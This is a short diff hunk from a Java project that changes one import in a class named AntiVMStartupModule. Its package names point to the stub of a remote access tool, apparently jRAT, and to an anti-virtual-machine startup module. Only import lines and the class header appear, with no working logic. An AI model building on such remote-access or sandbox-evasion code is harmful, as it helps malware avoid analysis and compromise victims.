@@ -5,8 +5,9 @@ import java.io.File;
 import java.io.InputStreamReader;
 import java.util.Map;
 
-import se.jrat.common.OperatingSystem;
 import se.jrat.stub.Configuration;
+
+import com.redpois0n.oslib.OperatingSystem;
 
 public class AntiVMStartupModule extends StartupModule {
 
